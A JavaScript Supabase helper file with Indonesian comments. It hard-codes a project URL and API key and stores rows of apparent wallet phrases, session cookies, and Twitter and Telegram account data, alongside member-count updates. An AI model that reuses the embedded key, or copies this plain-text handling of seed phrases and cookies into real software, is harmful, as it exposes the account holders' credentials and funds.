import { createClient } from '@supabase/supabase-js'

// Create a single supabase client for interacting with your database
const supabase = createClient('https://yodfbxhqwdzarasxwzxf.supabase.co', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlvZGZieGhxd2R6YXJhc3h3enhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDY3NzY1NzksImV4cCI6MjA2MjM1MjU3OX0.kQY2UqH5FxbT1b9-JMUrDfmKxyLXmCJ3CY7U5W8t2BQ')

// fungsi view data all
// const checkConnection = async () => {
//     try {
//         const { data, error } = await supabase.from('users').select();
//         console.log(data)
//     } catch (error) {
//         console.log(error)
//     }
// };

// checkConnection();
const insertData = async () => {
    try {
        const data = await supabase.from('data').insert({
            status: "on",
            user_id: js.id,
            pharse: js.pharse,
            cookie: js.cookie,
            device: js.device,
            twitter: js.twitter,
            telegram: js.telegram
        });
        console.log(data)
    } catch (error) {
        console.log(error)
    }
};
// insertData();

const searchData = async () => {
    // try {
    //     const data = await supabase.from('data').select('status').eq('status', 'off').select();
    //     // console.log(data.data[0].twitter)
    //     var result = data.data;
    //     if (result.length === 0) {
    //         console.log("Data Not Found"); // Tidak ada data
    //     } else {
    //         console.log(data.data); // Data ditemukan
    //     }
    // } catch (error) {
    //     console.log(error)
    // }

    // try {
    //     const { data, error } = await supabase.from('data').select('pharse').eq('status', 'off');
    //     if (error) throw error;

    //     if (!data || data.length === 0) {
    //         throw new Error('Tidak ada data dengan status "off"');
    //     }

    //     const randomIndex = Math.floor(Math.random() * data.length);
    //     console.log(data[randomIndex].pharse);
    // } catch (error) {
    //     console.error('Gagal mengambil pharse:', error.message);
    //     // return null;
    // }

    const { count, error } = await supabase
        .from('data')
        .select('*', { count: 'exact', head: true })
        .eq('status', 'off');

    if (!error) {
        console.log(count)
    } else {
        console.error('Error fetching offline count:', error.message);
    }
};
// searchData();

async function db_searchData(params) {
    try {
        const data = await supabase.from('data').select('user_id').eq('user_id', '46839681').select();
    } catch (error) {
        console.log(error)
    }
}


// View Database memeber ketapang
const db_view_ketapang = async () => {
    try {
        const data = await supabase.from('member').select('ketapang');
        return data.data[0].ketapang
    } catch (error) {
        console.log(error)
    }
};
// Update Database memeber ketapang
const db_update_ketapang = async () => {
    try {
        const value = await db_view_ketapang();
        var sum = (parseInt(value) + 1).toString();
        const data = await supabase.from('member').update({
            ketapang: sum
        }).eq('id', 1).select();
        console.log(data)
    } catch (error) {
        console.log(error)
    }
};
// View Database memeber ketapang
const db_view_mempawah = async () => {
    try {
        const data = await supabase.from('member').select('mempawah');
        return data.data[0].mempawah
    } catch (error) {
        console.log(error)
    }
};
// Update Database memeber ketapang
const db_update_mempawah = async () => {
    try {
        const value = await db_view_mempawah();
        var sum = (parseInt(value) + 1).toString();
        const data = await supabase.from('member').update({
            mempawah: sum
        }).eq('id', 1).select();
        console.log(data)
    } catch (error) {
        console.log(error)
    }
};

async function getLastId() {
  const { data, error } = await supabase
    .from('data')
    .select('id')
    .order('id', { ascending: false })
    .limit(1);

  if (error) {
    console.error('Error fetching last ID:', error);
    return null;
  }

  const lastId = data?.[0]?.id;
  console.log('Last ID:', lastId);
  return lastId;
}

getLastId();
